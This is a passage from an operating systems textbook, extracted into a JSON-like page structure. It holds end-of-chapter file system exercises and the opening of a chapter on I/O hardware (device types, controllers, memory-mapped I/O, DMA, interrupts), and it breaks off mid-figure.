(16,23); (17,21); (18,20); (19,15); (20, −1); (21, −1); (22,19); (23,14).\r\nIn the above notation, (x, y) indicates that the value stored in table entry x points to data\r\nblock y.\r\n36. Consider the idea behind Fig. 4-21, but now for a disk with a mean seek time of 6\r\nmsec, a rotational rate of 15,000 rpm, and 1,048,576 bytes per track. What are the data\r\nrates for block sizes of 1 KB, 2 KB, and 4 KB, respectively?\r\n37. A certain file system uses 4-KB disk blocks. The median file size is 1 KB. If all files\r\nwere exactly 1 KB, what fraction of the disk space would be wasted? Do you think the\r\nwastage for a real file system will be higher than this number or lower than it? Explain\r\nyour answer.\n336 FILE SYSTEMS CHAP. 4\r\n38. Given a disk-block size of 4 KB and block-pointer address value of 4 bytes, what is the\r\nlargest file size (in bytes) that can be accessed using 10 direct addresses and one indi\u0002rect block?\r\n39. Files in MS-DOS have to compete for space in the FAT -16 table in memory. If one file\r\nuses k entries, that is k entries that are not available to any other file, what constraint\r\ndoes this place on the total length of all files combined?\r\n40. A UNIX file system has 4-KB blocks and 4-byte disk addresses. What is the maximum\r\nfile size if i-nodes contain 10 direct entries, and one single, double, and triple indirect\r\nentry each?\r\n41. How many disk operations are needed to fetch the i-node for afile with the path name\r\n/usr/ast/courses/os/handout.t? Assume that the i-node for the root directory is in mem\u0002ory, but nothing else along the path is in memory. Also assume that all directories fit in\r\none disk block.\r\n42. In many UNIX systems, the i-nodes are kept at the start of the disk. An alternative de\u0002sign is to allocate an i-node when a file is created and put the i-node at the start of the\r\nfirst block of the file. Discuss the pros and cons of this alternative.\r\n43. Write a program that reverses the bytes of a file, so that the last byte is now first and\r\nthe first byte is now last. It must work with an arbitrarily long file, but try to make it\r\nreasonably efficient.\r\n44. Write a program that starts at a given directory and descends the file tree from that\r\npoint recording the sizes of all the files it finds. When it is all done, it should print a\r\nhistogram of the file sizes using a bin width specified as a parameter (e.g., with 1024,\r\nfile sizes of 0 to 1023 go in one bin, 1024 to 2047 go in the next bin, etc.).\r\n45. Write a program that scans all directories in a UNIX file system and finds and locates\r\nall i-nodes with a hard link count of two or more. For each such file, it lists together all\r\nfile names that point to the file.\r\n46. Write a new version of the UNIX ls program. This version takes as an argument one or\r\nmore directory names and for each directory lists all the files in that directory, one line\r\nper file. Each field should be formatted in a reasonable way given its type. List only\r\nthe first disk address, if any.\r\n47. Implement a program to measure the impact of application-level buffer sizes on read\r\ntime. This involves writing to and reading from a large file (say, 2 GB). Vary the appli\u0002cation buffer size (say, from 64 bytes to 4 KB). Use timing measurement routines (such\r\nas gettimeofday and getitimer on UNIX) to measure the time taken for different buffer\r\nsizes. Analyze the results and report your findings: does buffer size make a difference\r\nto the overall write time and per-write time?\r\n48. Implement a simulated file system that will be fully contained in a single regular file\r\nstored on the disk. This disk file will contain directories, i-nodes, free-block infor\u0002mation, file data blocks, etc. Choose appropriate algorithms for maintaining free-block\r\ninformation and for allocating data blocks (contiguous, indexed, linked). Your pro\u0002gram will accept system commands from the user to create/delete directories, cre\u0002ate/delete/open files, read/write from/to a selected file, and to list directory contents.\n5\r\nINPUT/OUTPUT\r\nIn addition to providing abstractions such as processes, address spaces, and\r\nfiles, an operating system also controls all the computer’s I/O (Input/Output) de\u0002vices. It must issue commands to the devices, catch interrupts, and handle errors.\r\nIt should also provide an interface between the devices and the rest of the system\r\nthat is simple and easy to use. To the extent possible, the interface should be the\r\nsame for all devices (device independence). The I/O code represents a significant\r\nfraction of the total operating system. How the operating system manages I/O is\r\nthe subject of this chapter.\r\nThis chapter is organized as follows. We will look first at some of the prin\u0002ciples of I/O hardware and then at I/O software in general. I/O software can be\r\nstructured in layers, with each having a well-defined task. We will look at these\r\nlayers to see what they do and how they fit together.\r\nNext, we will look at several I/O devices in detail: disks, clocks, keyboards,\r\nand displays. For each device we will look at its hardware and software. Finally,\r\nwe will consider power management.\r\n5.1 PRINCIPLES OF I/O HARDWARE\r\nDifferent people look at I/O hardware in different ways. Electrical engineers\r\nlook at it in terms of chips, wires, power supplies, motors, and all the other physi\u0002cal components that comprise the hardware. Programmers look at the interface\r\n337"
      }
    }
  },
  "5 INPUT/OUTPUT": {
    "page": 368,
    "children": {
      "5.1 PRINCIPLES OF I/O HARDWARE": {
        "page": 368,
        "children": {
          "5.1.1 I/O Devices": {
            "page": 369,
            "content": "5.1.1 I/O Devices\r\nI/O devices can be roughly divided into two categories: block devices and\r\ncharacter devices. A block device is one that stores information in fixed-size\r\nblocks, each one with its own address. Common block sizes range from 512 to\r\n65,536 bytes. All transfers are in units of one or more entire (consecutive) blocks.\r\nThe essential property of a block device is that it is possible to read or write each\r\nblock independently of all the other ones. Hard disks, Blu-ray discs, and USB\r\nsticks are common block devices.\r\nIf you look very closely, the boundary between devices that are block address\u0002able and those that are not is not well defined. Everyone agrees that a disk is a\r\nblock addressable device because no matter where the arm currently is, it is always\r\npossible to seek to another cylinder and then wait for the required block to rotate\r\nunder the head. Now consider an old-fashioned tape drive still used, sometimes, for\r\nmaking disk backups (because tapes are cheap). Tapes contain a sequence of\r\nblocks. If the tape drive is giv en a command to read block N, it can always rewind\r\nthe tape and go forward until it comes to block N. This operation is analogous to a\r\ndisk doing a seek, except that it takes much longer. Also, it may or may not be pos\u0002sible to rewrite one block in the middle of a tape. Even if it were possible to use\r\ntapes as random access block devices, that is stretching the point somewhat: they\r\nare normally not used that way.\r\nThe other type of I/O device is the character device. A character device deliv\u0002ers or accepts a stream of characters, without regard to any block structure. It is\r\nnot addressable and does not have any seek operation. Printers, network interfaces,\r\nmice (for pointing), rats (for psychology lab experiments), and most other devices\r\nthat are not disk-like can be seen as character devices.\r\nThis classification scheme is not perfect. Some devices do not fit in. Clocks,\r\nfor example, are not block addressable. Nor do they generate or accept character\r\nstreams. All they do is cause interrupts at well-defined intervals. Memory-mapped\r\nscreens do not fit the model well either. Nor do touch screens, for that matter. Still,\r\nthe model of block and character devices is general enough that it can be used as a\r\nbasis for making some of the operating system software dealing with I/O device in\u0002dependent. The file system, for example, deals just with abstract block devices and\r\nleaves the device-dependent part to lower-level software.\nSEC. 5.1 PRINCIPLES OF I/O HARDWARE 339\r\nI/O devices cover a huge range in speeds, which puts considerable pressure on\r\nthe software to perform well over many orders of magnitude in data rates. Figure\r\n5-1 shows the data rates of some common devices. Most of these devices tend to\r\nget faster as time goes on.\r\nDevice Data rate\r\nKe yboard 10 bytes/sec\r\nMouse 100 bytes/sec\r\n56K modem 7 KB/sec\r\nScanner at 300 dpi 1 MB/sec\r\nDigital camcorder 3.5 MB/sec\r\n4x Blu-ray disc 18 MB/sec\r\n802.11n Wireless 37.5 MB/sec\r\nUSB 2.0 60 MB/sec\r\nFireWire 800 100 MB/sec\r\nGigabit Ethernet 125 MB/sec\r\nSATA 3 disk drive 600 MB/sec\r\nUSB 3.0 625 MB/sec\r\nSCSI Ultra 5 bus 640 MB/sec\r\nSingle-lane PCIe 3.0 bus 985 MB/sec\r\nThunderbolt 2 bus 2.5 GB/sec\r\nSONET OC-768 networ k 5 GB/sec\r\nFigure 5-1. Some typical device, network, and bus data rates."
          },
          "5.1.2 Device Controllers": {
            "page": 370,
            "content": "5.1.2 Device Controllers\r\nI/O units often consist of a mechanical component and an electronic compo\u0002nent. It is possible to separate the two portions to provide a more modular and\r\ngeneral design. The electronic component is called the device controller or\r\nadapter. On personal computers, it often takes the form of a chip on the par\u0002entboard or a printed circuit card that can be inserted into a (PCIe) expansion slot.\r\nThe mechanical component is the device itself. This arrangement is shown in\r\nFig. 1-6.\r\nThe controller card usually has a connector on it, into which a cable leading to\r\nthe device itself can be plugged. Many controllers can handle two, four, or even\r\neight identical devices. If the interface between the controller and device is a stan\u0002dard interface, either an official ANSI, IEEE, or ISO standard or a de facto one,\r\nthen companies can make controllers or devices that fit that interface. Many com\u0002panies, for example, make disk drives that match the SATA, SCSI, USB, Thunder\u0002bolt, or FireWire (IEEE 1394) interfaces.\n340 INPUT/OUTPUT CHAP. 5\r\nThe interface between the controller and the device is often a very low-level\r\none. A disk, for example, might be formatted with 2,000,000 sectors of 512 bytes\r\nper track. What actually comes off the drive, howev er, is a serial bit stream, start\u0002ing with a preamble, then the 4096 bits in a sector, and finally a checksum, or\r\nECC (Error-Correcting Code). The preamble is written when the disk is for\u0002matted and contains the cylinder and sector number, the sector size, and similar\r\ndata, as well as synchronization information.\r\nThe controller’s job is to convert the serial bit stream into a block of bytes and\r\nperform any error correction necessary. The block of bytes is typically first assem\u0002bled, bit by bit, in a buffer inside the controller. After its checksum has been veri\u0002fied and the block has been declared to be error free, it can then be copied to main\r\nmemory.\r\nThe controller for an LCD display monitor also works as a bit serial device at\r\nan equally low lev el. It reads bytes containing the characters to be displayed from\r\nmemory and generates the signals to modify the polarization of the backlight for\r\nthe corresponding pixels in order to write them on screen. If it were not for the\r\ndisplay controller, the operating system programmer would have to explicitly pro\u0002gram the electric fields of all pixels. With the controller, the operating system ini\u0002tializes the controller with a few parameters, such as the number of characters or\r\npixels per line and number of lines per screen, and lets the controller take care of\r\nactually driving the electric fields.\r\nIn a very short time, LCD screens have completely replaced the old CRT\r\n(Cathode Ray Tube) monitors. CRT monitors fire a beam of electrons onto a flu\u0002orescent screen. Using magnetic fields, the system is able to bend the beam and\r\ndraw pixels on the screen. Compared to LCD screens, CRT monitors were bulky,\r\npower hungry, and fragile. Moreover, the resolution on today´s (Retina) LCD\r\nscreens is so good that the human eye is unable to distinguish individual pixels. It\r\nis hard to imagine today that laptops in the past came with a small CRT screen that\r\nmade them more than 20 cm deep with a nice work-out weight of around 12 kilos."
          },
          "5.1.3 Memory-Mapped I/O": {
            "page": 371,
            "content": "5.1.3 Memory-Mapped I/O\r\nEach controller has a few registers that are used for communicating with the\r\nCPU. By writing into these registers, the operating system can command the de\u0002vice to deliver data, accept data, switch itself on or off, or otherwise perform some\r\naction. By reading from these registers, the operating system can learn what the\r\ndevice’s state is, whether it is prepared to accept a new command, and so on.\r\nIn addition to the control registers, many devices have a data buffer that the op\u0002erating system can read and write. For example, a common way for computers to\r\ndisplay pixels on the screen is to have a video RAM, which is basically just a data\r\nbuffer, available for programs or the operating system to write into.\r\nThe issue thus arises of how the CPU communicates with the control registers\r\nand also with the device data buffers. Two alternatives exist. In the first approach,\nSEC. 5.1 PRINCIPLES OF I/O HARDWARE 341\r\neach control register is assigned an I/O port number, an 8- or 16-bit integer. The\r\nset of all the I/O ports form the I/O port space, which is protected so that ordinary\r\nuser programs cannot access it (only the operating system can). Using a special\r\nI/O instruction such as\r\nIN REG,PORT,\r\nthe CPU can read in control register PORT and store the result in CPU register\r\nREG. Similarly, using\r\nOUT PORT,REG\r\nthe CPU can write the contents of REG to a control register. Most early computers,\r\nincluding nearly all mainframes, such as the IBM 360 and all of its successors,\r\nworked this way.\r\nIn this scheme, the address spaces for memory and I/O are different, as shown\r\nin Fig. 5-2(a). The instructions\r\nIN R0,4\r\nand\r\nMOV R0,4\r\nare completely different in this design. The former reads the contents of I/O port 4\r\nand puts it in R0 whereas the latter reads the contents of memory word 4 and puts it\r\nin R0. The 4s in these examples refer to different and unrelated address spaces.\r\nTwo address One address space Two address spaces\r\nMemory\r\nI/O ports\r\n0xFFFF…\r\n0\r\n(a) (b) (c)\r\nFigure 5-2. (a) Separate I/O and memory space. (b) Memory-mapped I/O.\r\n(c) Hybrid.\r\nThe second approach, introduced with the PDP-11, is to map all the control\r\nregisters into the memory space, as shown in Fig. 5-2(b). Each control register is\r\nassigned a unique memory address to which no memory is assigned. This system is\r\ncalled memory-mapped I/O. In most systems, the assigned addresses are at or\r\nnear the top of the address space. A hybrid scheme, with memory-mapped I/O\r\ndata buffers and separate I/O ports for the control registers, is shown in Fig. 5-2(c).\n342 INPUT/OUTPUT CHAP. 5\r\nThe x86 uses this architecture, with addresses 640K to 1M − 1 being reserved for\r\ndevice data buffers in IBM PC compatibles, in addition to I/O ports 0 to 64K − 1.\r\nHow do these schemes actually work in practice? In all cases, when the CPU\r\nwants to read a word, either from memory or from an I/O port, it puts the address it\r\nneeds on the bus’ address lines and then asserts a READ signal on a bus’ control\r\nline. A second signal line is used to tell whether I/O space or memory space is\r\nneeded. If it is memory space, the memory responds to the request. If it is I/O\r\nspace, the I/O device responds to the request. If there is only memory space [as in\r\nFig. 5-2(b)], ev ery memory module and every I/O device compares the address\r\nlines to the range of addresses that it services. If the address falls in its range, it re\u0002sponds to the request. Since no address is ever assigned to both memory and an\r\nI/O device, there is no ambiguity and no conflict.\r\nThese two schemes for addressing the controllers have different strengths and\r\nweaknesses. Let us start with the advantages of memory-mapped I/O. Firstof all, if\r\nspecial I/O instructions are needed to read and write the device control registers,\r\naccess to them requires the use of assembly code since there is no way to execute\r\nan IN or OUT instruction in C or C++. Calling such a procedure adds overhead to\r\ncontrolling I/O. In contrast, with memory-mapped I/O, device control registers are\r\njust variables in memory and can be addressed in C the same way as any other var\u0002iables. Thus with memory-mapped I/O, an I/O device driver can be written entirely\r\nin C. Without memory-mapped I/O, some assembly code is needed.\r\nSecond, with memory-mapped I/O, no special protection mechanism is needed\r\nto keep user processes from performing I/O. All the operating system has to do is\r\nrefrain from putting that portion of the address space containing the control regis\u0002ters in any user’s virtual address space. Better yet, if each device has its control\r\nregisters on a different page of the address space, the operating system can give a\r\nuser control over specific devices but not others by simply including the desired\r\npages in its page table. Such a scheme can allow different device drivers to be\r\nplaced in different address spaces, not only reducing kernel size but also keeping\r\none driver from interfering with others.\r\nThird, with memory-mapped I/O, every instruction that can reference memory\r\ncan also reference control registers. For example, if there is an instruction, TEST,\r\nthat tests a memory word for 0, it can also be used to test a control register for 0,\r\nwhich might be the signal that the device is idle and can accept a new command.\r\nThe assembly language code might look like this:\r\nLOOP: TEST PORT 4 // check if por t 4 is 0\r\nBEQ READY // if it is 0, go to ready\r\nBRANCH LOOP // otherwise, continue testing\r\nREADY:\r\nIf memory-mapped I/O is not present, the control register must first be read into\r\nthe CPU, then tested, requiring two instructions instead of just one. In the case of\nSEC. 5.1 PRINCIPLES OF I/O HARDWARE 343\r\nthe loop given above, a fourth instruction has to be added, slightly slowing down\r\nthe responsiveness of detecting an idle device.\r\nIn computer design, practically everything involves trade-offs, and that is the\r\ncase here, too. Memory-mapped I/O also has its disadvantages. First, most com\u0002puters nowadays have some form of caching of memory words. Caching a device\r\ncontrol register would be disastrous. Consider the assembly-code loop given above\r\nin the presence of caching. The first reference to PORT 4 would cause it to be\r\ncached. Subsequent references would just take the value from the cache and not\r\nev en ask the device. Then when the device finally became ready, the software\r\nwould have no way of finding out. Instead, the loop would go on forever.\r\nTo prevent this situation with memory-mapped I/O, the hardware has to be able\r\nto selectively disable caching, for example, on a per-page basis. This feature adds\r\nextra complexity to both the hardware and the operating system, which has to man\u0002age the selective caching.\r\nSecond, if there is only one address space, then all memory modules and all\r\nI/O devices must examine all memory references to see which ones to respond to.\r\nIf the computer has a single bus, as in Fig. 5-3(a), having everyone look at every\r\naddress is straightforward.\r\nCPU Memory I/O\r\nBus All addresses (memory\r\nand I/O) go here\r\nCPU Memory I/O\r\nCPU reads and writes of memory\r\ngo over this high-bandwidth bus\r\nThis memory port is\r\nto allow I/O devices\r\naccess to memory\r\n(a) (b)\r\nFigure 5-3. (a) A single-bus architecture. (b) A dual-bus memory architecture.\r\nHowever, the trend in modern personal computers is to have a dedicated high\u0002speed memory bus, as shown in Fig. 5-3(b). The bus is tailored to optimize memo\u0002ry performance, with no compromises for the sake of slow I/O devices. x86 sys\u0002tems can have multiple buses (memory, PCIe, SCSI, and USB), as shown in\r\nFig. 1-12.\r\nThe trouble with having a separate memory bus on memory-mapped machines\r\nis that the I/O devices have no way of seeing memory addresses as they go by on\r\nthe memory bus, so they hav e no way of responding to them. Again, special meas\u0002ures have to be taken to make memory-mapped I/O work on a system with multiple\n344 INPUT/OUTPUT CHAP. 5\r\nbuses. One possibility is to first send all memory references to the memory. If the\r\nmemory fails to respond, then the CPU tries the other buses. This design can be\r\nmade to work but requires additional hardware complexity.\r\nA second possible design is to put a snooping device on the memory bus to\r\npass all addresses presented to potentially interested I/O devices. The problem here\r\nis that I/O devices may not be able to process requests at the speed the memory\r\ncan.\r\nA third possible design, and one that would well match the design sketched in\r\nFig. 1-12, is to filter addresses in the memory controller. In that case, the memory\r\ncontroller chip contains range registers that are preloaded at boot time. For ex\u0002ample, 640K to 1M − 1 could be marked as a nonmemory range. Addresses that\r\nfall within one of the ranges marked as nonmemory are forwarded to devices in\u0002stead of to memory. The disadvantage of this scheme is the need for figuring out at\r\nboot time which memory addresses are not really memory addresses. Thus each\r\nscheme has arguments for and against it, so compromises and trade-offs are\r\ninevitable."
          },
          "5.1.4 Direct Memory Access": {
            "page": 375,
            "content": "5.1.4 Direct Memory Access\r\nNo matter whether a CPU does or does not have memory-mapped I/O, it needs\r\nto address the device controllers to exchange data with them. The CPU can request\r\ndata from an I/O controller one byte at a time, but doing so wastes the CPU’s time,\r\nso a different scheme, called DMA (Direct Memory Access) is often used. To\r\nsimplify the explanation, we assume that the CPU accesses all devices and memory\r\nvia a single system bus that connects the CPU, the memory, and the I/O devices, as\r\nshown in Fig. 5-4. We already know that the real organization in modern systems is\r\nmore complicated, but all the principles are the same. The operating system can\r\nuse only DMA if the hardware has a DMA controller, which most systems do.\r\nSometimes this controller is integrated into disk controllers and other controllers,\r\nbut such a design requires a separate DMA controller for each device. More com\u0002monly, a single DMA controller is available (e.g., on the parentboard) for regulat\u0002ing transfers to multiple devices, often concurrently.\r\nNo matter where it is physically located, the DMA controller has access to the\r\nsystem bus independent of the CPU, as shown in Fig. 5-4. It contains several reg\u0002isters that can be written and read by the CPU. These include a memory address\r\nregister, a byte count register, and one or more control registers. The control regis\u0002ters specify the I/O port to use, the direction of the transfer (reading from the I/O\r\ndevice or writing to the I/O device), the transfer unit (byte at a time or word at a\r\ntime), and the number of bytes to transfer in one burst.\r\nTo explain how DMA works, let us first look at how disk reads occur when\r\nDMA is not used. First the disk controller reads the block (one or more sectors)\r\nfrom the drive serially, bit by bit, until the entire block is in the controller’s internal\r\nbuffer. Next, it computes the checksum to verify that no read errors have occurred.\nSEC. 5.1 PRINCIPLES OF I/O HARDWARE 345\r\nCPU\r\nDMA\r\ncontroller\r\nDisk\r\ncontroller\r\nMain\r\nmemory\r\nBuffer\r\n1. CPU\r\nprograms\r\nthe DMA\r\ncontroller\r\nInterrupt when\r\ndone\r\n2. DMA requests\r\ntransfer to memory 3. Data transferred\r\nBus\r\n4. Ack\r\nAddress\r\nCount\r\nControl\r\nDrive\r\nFigure 5-4. Operation of a DMA transfer.\r\nThen the controller causes an interrupt. When the operating system starts running,\r\nit can read the disk block from the controller’s buffer a byte or a word at a time by\r\nexecuting a loop, with each iteration reading one byte or word from a controller de\u0002vice register and storing it in main memory.\r\nWhen DMA is used, the procedure is different. First the CPU programs the\r\nDMA controller by setting its registers so it knows what to transfer where (step 1\r\nin Fig. 5-4). It also issues a command to the disk controller telling it to read data\r\nfrom the disk into its internal buffer and verify the checksum. When valid data are\r\nin the disk controller’s buffer, DMA can begin.\r\nThe DMA controller initiates the transfer by issuing a read request over the bus\r\nto the disk controller (step 2). This read request looks like any other read request,\r\nand the disk controller does not know (or care) whether it came from the CPU or\r\nfrom a DMA controller. Typically, the memory address to write to is on the bus’\r\naddress lines, so when the disk controller fetches the next word from its internal\r\nbuffer, it knows where to write it. The write to memory is another standard bus\r\ncycle (step 3). When the write is complete, the disk controller sends an acknowl\u0002edgement signal to the DMA controller, also over the bus (step 4). The DMA con\u0002troller then increments the memory address to use and decrements the byte count.\r\nIf the byte count is still greater than 0, steps 2 through 4 are repeated until the\r\ncount reaches 0. At that time, the DMA controller interrupts the CPU to let it\r\nknow that the transfer is now complete. When the operating system starts up, it\r\ndoes not have to copy the disk block to memory; it is already there.\r\nDMA controllers vary considerably in their sophistication. The simplest ones\r\nhandle one transfer at a time, as described above. More complex ones can be pro\u0002grammed to handle multiple transfers at the same time. Such controllers have mul\u0002tiple sets of registers internally, one for each channel. The CPU starts by loading\r\neach set of registers with the relevant parameters for its transfer. Each transfer must\n346 INPUT/OUTPUT CHAP. 5\r\nuse a different device controller. After each word is transferred (steps 2 through 4)\r\nin Fig. 5-4, the DMA controller decides which device to service next. It may be set\r\nup to use a round-robin algorithm, or it may have a priority scheme design to favor\r\nsome devices over others. Multiple requests to different device controllers may be\r\npending at the same time, provided that there is an unambiguous way to tell the ac\u0002knowledgements apart. Often a different acknowledgement line on the bus is used\r\nfor each DMA channel for this reason.\r\nMany buses can operate in two modes: word-at-a-time mode and block mode.\r\nSome DMA controllers can also operate in either mode. In the former mode, the\r\noperation is as described above: the DMA controller requests the transfer of one\r\nword and gets it. If the CPU also wants the bus, it has to wait. The mechanism is\r\ncalled cycle stealing because the device controller sneaks in and steals an occa\u0002sional bus cycle from the CPU once in a while, delaying it slightly. In block mode,\r\nthe DMA controller tells the device to acquire the bus, issue a series of transfers,\r\nthen release the bus. This form of operation is called burst mode. It is more ef\u0002ficient than cycle stealing because acquiring the bus takes time and multiple words\r\ncan be transferred for the price of one bus acquisition. The down side to burst\r\nmode is that it can block the CPU and other devices for a substantial period if a\r\nlong burst is being transferred.\r\nIn the model we have been discussing, sometimes called fly-by mode, the\r\nDMA controller tells the device controller to transfer the data directly to main\r\nmemory. An alternative mode that some DMA controllers use is to have the device\r\ncontroller send the word to the DMA controller, which then issues a second bus re\u0002quest to write the word to wherever it is supposed to go. This scheme requires an\r\nextra bus cycle per word transferred, but is more flexible in that it can also perform\r\ndevice-to-device copies and even memory-to-memory copies (by first issuing a\r\nread to memory and then issuing a write to memory at a different address).\r\nMost DMA controllers use physical memory addresses for their transfers.\r\nUsing physical addresses requires the operating system to convert the virtual ad\u0002dress of the intended memory buffer into a physical address and write this physical\r\naddress into the DMA controller’s address register. An alternative scheme used in\r\na few DMA controllers is to write virtual addresses into the DMA controller in\u0002stead. Then the DMA controller must use the MMU to have the virtual-to-physical\r\ntranslation done. Only in the case that the MMU is part of the memory (possible,\r\nbut rare), rather than part of the CPU, can virtual addresses be put on the bus.\r\nWe mentioned earlier that the disk first reads data into its internal buffer before\r\nDMA can start. You may be wondering why the controller does not just store the\r\nbytes in main memory as soon as it gets them from the disk. In other words, why\r\ndoes it need an internal buffer? There are two reasons. First, by doing internal\r\nbuffering, the disk controller can verify the checksum before starting a transfer. If\r\nthe checksum is incorrect, an error is signaled and no transfer is done.\r\nThe second reason is that once a disk transfer has started, the bits keep arriving\r\nfrom the disk at a constant rate, whether the controller is ready for them or not. If\nSEC. 5.1 PRINCIPLES OF I/O HARDWARE 347\r\nthe controller tried to write data directly to memory, it would have to go over the\r\nsystem bus for each word transferred. If the bus were busy due to some other de\u0002vice using it (e.g., in burst mode), the controller would have to wait. If the next\r\ndisk word arrived before the previous one had been stored, the controller would\r\nhave to store it somewhere. If the bus were very busy, the controller might end up\r\nstoring quite a few words and having a lot of administration to do as well. When\r\nthe block is buffered internally, the bus is not needed until the DMA begins, so the\r\ndesign of the controller is much simpler because the DMA transfer to memory is\r\nnot time critical. (Some older controllers did, in fact, go directly to memory with\r\nonly a small amount of internal buffering, but when the bus was very busy, a trans\u0002fer might have had to be terminated with an overrun error.)\r\nNot all computers use DMA. The argument against it is that the main CPU is\r\noften far faster than the DMA controller and can do the job much faster (when the\r\nlimiting factor is not the speed of the I/O device). If there is no other work for it to\r\ndo, having the (fast) CPU wait for the (slow) DMA controller to finish is pointless.\r\nAlso, getting rid of the DMA controller and having the CPU do all the work in\r\nsoftware saves money, important on low-end (embedded) computers."
          },
          "5.1.5 Interrupts Revisited": {
            "page": 378,
            "content": "5.1.5 Interrupts Revisited\r\nWe briefly introduced interrupts in Sec. 1.3.4, but there is more to be said. In a\r\ntypical personal computer system, the interrupt structure is as shown in Fig. 5-5.\r\nAt the hardware level, interrupts work as follows. When an I/O device has finished\r\nthe work given to it, it causes an interrupt (assuming that interrupts have been\r\nenabled by the operating system). It does this by asserting a signal on a bus line\r\nthat it has been assigned. This signal is detected by the interrupt controller chip on\r\nthe parentboard, which then decides what to do.\r\nCPU\r\nInterrupt\r\ncontroller 3. CPU acks\r\n interrupt\r\n2. Controller \r\n issues\r\n interrupt\r\n1. Device is finished\r\nDisk\r\nKeyboard\r\nPrinter\r\nClock\r\nBus\r\n12\r\n6\r\n9 3\r\n8 4 7 5\r\n11 1 10 2\r\nFigure 5-5. How an interrupt happens. The connections between the devices and\r\nthe controller actually use interrupt lines on the bus rather than dedicated wires.\r\nIf no other interrupts are pending, the interrupt controller handles the interrupt\r\nimmediately. Howev er, if another interrupt is in progress, or another device has\r\nmade a simultaneous request on a higher-priority interrupt request line on the bus,\n348 INPUT/OUTPUT CHAP. 5\r\nthe device is just ignored for the moment. In this case it continues to assert an in\u0002terrupt signal on the bus until it is serviced by the CPU.\r\nTo handle the interrupt, the controller puts a number on the address lines speci\u0002fying which device wants attention and asserts a signal to interrupt the CPU.\r\nThe interrupt signal causes the CPU to stop what it is doing and start doing\r\nsomething else. The number on the address lines is used as an index into a table\r\ncalled the interrupt vector to fetch a new program counter. This program counter\r\npoints to the start of the corresponding interrupt-service procedure. Typically traps\r\nand interrupts use the same mechanism from this point on, often sharing the same\r\ninterrupt vector. The location of the interrupt vector can be hardwired into the ma\u0002chine or it can be anywhere in memory, with a CPU register (loaded by the operat\u0002ing system) pointing to its origin.\r\nShortly after it starts running, the interrupt-service procedure acknowledges\r\nthe interrupt by writing a certain value to one of the interrupt controller’s I/O ports.\r\nThis acknowledgement tells the controller that it is free to issue another interrupt.\r\nBy having the CPU delay this acknowledgement until it is ready to handle the next\r\ninterrupt, race conditions involving multiple (almost simultaneous) interrupts can\r\nbe avoided. As an aside, some (older) computers do not have a centralized inter\u0002rupt controller, so each device controller requests its own interrupts.\r\nThe hardware always saves certain information before starting the service pro\u0002cedure. Which information is saved and where it is saved varies greatly from CPU\r\nto CPU. As a bare minimum, the program counter must be saved, so the inter\u0002rupted process can be restarted. At the other extreme, all the visible registers and a\r\nlarge number of internal registers may be saved as well.\r\nOne issue is where to save this information. One option is to put it in internal\r\nregisters that the operating system can read out as needed. A problem with this ap\u0002proach is that then the interrupt controller cannot be acknowledged until all poten\u0002tially relevant information has been read out, lest a second interrupt overwrite the\r\ninternal registers saving the state. This strategy leads to long dead times when in\u0002terrupts are disabled and possibly to lost interrupts and lost data.\r\nConsequently, most CPUs save the information on the stack. However, this ap\u0002proach, too, has problems. To start with: whose stack? If the current stack is used,\r\nit may well be a user process stack. The stack pointer may not even be leg al, which\r\nwould cause a fatal error when the hardware tried to write some words at the ad\u0002dress pointed to. Also, it might point to the end of a page. After several memory\r\nwrites, the page boundary might be exceeded and a page fault generated. Having a\r\npage fault occur during the hardware interrupt processing creates a bigger problem:\r\nwhere to save the state to handle the page fault?\r\nIf the kernel stack is used, there is a much better chance of the stack pointer\r\nbeing legal and pointing to a pinned page. However, switching into kernel mode\r\nmay require changing MMU contexts and will probably invalidate most or all of\r\nthe cache and TLB. Reloading all of these, statically or dynamically, will increase\r\nthe time to process an interrupt and thus waste CPU time.\nSEC. 5.1 PRINCIPLES OF I/O HARDWARE 349\r\nPrecise and Imprecise Interrupts\r\nAnother problem is caused by the fact that most modern CPUs are heavily\r\npipelined and often superscalar (internally parallel). In older systems, after each\r\ninstruction was finished executing, the microprogram or hardware checked to see if\r\nthere was an interrupt pending. If so, the program counter and PSW were pushed\r\nonto the stack and the interrupt sequence begun. After the interrupt handler ran, the\r\nreverse process took place, with the old PSW and program counter popped from\r\nthe stack and the previous process continued.\r\nThis model makes the implicit assumption that if an interrupt occurs just after\r\nsome instruction, all the instructions up to and including that instruction have been\r\nexecuted completely, and no instructions after it have executed at all. On older ma\u0002chines, this assumption was always valid. On modern ones it may not be.\r\nFor starters, consider the pipeline model of Fig. 1-7(a). What happens if an in\u0002terrupt occurs while the pipeline is full (the usual case)? Many instructions are in\r\nvarious stages of execution. When the interrupt occurs, the value of the program\r\ncounter may not reflect the correct boundary between executed instructions and\r\nnonexecuted instructions. In fact, many instructions may have been partially ex\u0002ecuted, with different instructions being more or less complete. In this situation,\r\nthe program counter most likely reflects the address of the next instruction to be\r\nfetched and pushed into the pipeline rather than the address of the instruction that\r\njust was processed by the execution unit.\r\nOn a superscalar machine, such as that of Fig. 1-7(b), things are even worse.\r\nInstructions may be decomposed into micro-operations and the micro-operations\r\nmay execute out of order, depending on the availability of internal resources such\r\nas functional units and registers. At the time of an interrupt, some instructions\r\nstarted long ago may not have started and others started more recently may be al\u0002most done. At the point when an interrupt is signaled, there may be many instruc\u0002tions in various states of completeness, with less relation between them and the\r\nprogram counter.\r\nAn interrupt that leaves the machine in a well-defined state is called a precise\r\ninterrupt (Walker and Cragon, 1995). Such an interrupt has four properties:\r\n1. The PC (Program Counter) is saved in a known place.\r\n2. All instructions before the one pointed to by the PC have completed.\r\n3. No instruction beyond the one pointed to by the PC has finished.\r\n4. The execution state of the instruction pointed to by the PC is known.\r\nNote that there is no prohibition on instructions beyond the one pointed to by the\r\nPC from starting. It is just that any changes they make to registers or memory\r\nmust be undone before the interrupt happens. It is permitted that the instruction\r\npointed to has been executed. It is also permitted that it has not been executed.\n350 INPUT/OUTPUT CHAP. 5\r\nHowever, it must be clear which case applies. Often, if the interrupt is an I/O inter\u0002rupt, the instruction will not yet have started. However, if the interrupt is really a\r\ntrap or page fault, then the PC generally points to the instruction that caused the\r\nfault so it can be restarted later. The situation of Fig. 5-6(a) illustrates a precise in\u0002terrupt. All instructions up to the program counter (316) have completed and none\r\nof those beyond it have started (or have been rolled back to undo their effects).\r\n(a) (b)\r\n300\r\n304\r\n308\r\nPC\r\n312\r\n316 PC\r\nNot executed\r\nNot executed\r\nNot executed\r\nNot executed\r\nFully executed\r\nFully executed\r\nFully executed\r\nFully executed\r\n80% executed\r\n60% 